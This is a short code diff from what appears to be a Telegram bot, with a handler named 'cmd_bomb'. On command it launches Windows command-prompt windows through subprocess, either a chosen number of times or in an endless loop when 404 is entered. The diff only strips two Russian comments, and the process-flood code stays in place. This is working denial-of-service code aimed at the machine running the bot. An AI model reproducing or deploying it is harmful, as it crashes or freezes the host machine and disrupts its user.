@@ -43,11 +43,9 @@ def register_cmd_bomb(dp):
                     await message.answer("Количество должно быть неотрицательным. Пожалуйста, попробуйте снова.")
                     return
                 elif BOOM == 404:
-                    # Бесконечный запуск командных строк
                     while True:
                         subprocess.Popen('start cmd', shell=True)
                 else:
-                    # Запускаем BOOM раз
                     for _ in range(BOOM):
                         subprocess.Popen('start cmd', shell=True)
                     await state.clear()
